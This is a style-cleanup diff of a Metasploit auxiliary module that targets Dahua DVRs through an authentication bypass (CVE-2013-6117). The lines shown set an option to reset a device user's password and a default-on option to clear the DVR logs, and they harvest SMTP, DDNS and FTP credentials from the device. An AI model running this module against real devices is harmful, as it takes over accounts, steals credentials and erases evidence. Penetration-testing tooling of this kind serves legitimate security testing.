@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
@@ -13,11 +14,11 @@ class MetasploitModule < Msf::Auxiliary
         'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module
         'Nathan McBride' # regex extraordinaire
       ],
-      'References'      => [
+      'References' => [
         [ 'CVE', '2013-6117' ],
         [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
       ],
-      'License'         => MSF_LICENSE,
+      'License' => MSF_LICENSE,
       'DefaultAction'  => 'VERSION',
       'Actions'        =>
         [
@@ -35,11 +36,11 @@ class MetasploitModule < Msf::Auxiliary
 
     deregister_options('RHOST')
     register_options([
-      OptString.new('USERNAME', [false, 'A username to reset', '888888']),
-      OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
-      OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), true]),
-      Opt::RPORT(37777)
-    ])
+                       OptString.new('USERNAME', [false, 'A username to reset', '888888']),
+                       OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
+                       OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), true]),
+                       Opt::RPORT(37777)
+                     ])
   end
 
   U1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
@@ -111,10 +112,10 @@ class MetasploitModule < Msf::Auxiliary
       print_status("#{peer} --  Server: #{mailhost[0]}") unless mailhost[0].blank?
       print_status("#{peer} --  Server Port: #{mailhost[1]}") unless mailhost[1].blank?
       print_status("#{peer} --  Destination Email: #{data[1]}") unless data[1].blank?
-      mailserver = "#{mailhost[0]}"
-      mailport = "#{mailhost[1]}"
-      muser = "#{data[5]}"
-      mpass = "#{data[6]}"
+      mailserver = (mailhost[0]).to_s
+      mailport = (mailhost[1]).to_s
+      muser = (data[5]).to_s
+      mpass = (data[6]).to_s
     end
     return if muser.blank? && mpass.blank?
     print_good("  SMTP User: #{data[5]}")
@@ -144,9 +145,7 @@ class MetasploitModule < Msf::Auxiliary
       ddns_pass = val[5]
       ddns_table << [ peer, ddns_service, ddns_server, ddns_port, ddns_domain, ddns_user, ddns_pass ]
       unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?
-        if datastore['VERBOSE']
-          ddns_table.print
-        end
+        ddns_table.print if datastore['VERBOSE']
         report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
       end
     end
@@ -177,7 +176,8 @@ class MetasploitModule < Msf::Auxiliary
           user: ftpuser,
           pass: ftppass,
           type: "FTP",
-          active: true)
+          active: true
+        )
       end
     end
   end
@@ -243,8 +243,8 @@ class MetasploitModule < Msf::Auxiliary
       'Columns' => ['ID', 'Peer', 'Group']
     )
     data.each do |val|
-      number = "#{val[/(([\d]+))/]}"
-      groups = "#{val[/(([a-z]+))/]}"
+      number = (val[/(([\d]+))/]).to_s
+      groups = (val[/(([a-z]+))/]).to_s
       groups_table << [ number, peer, groups ]
     end
     groups_table.print
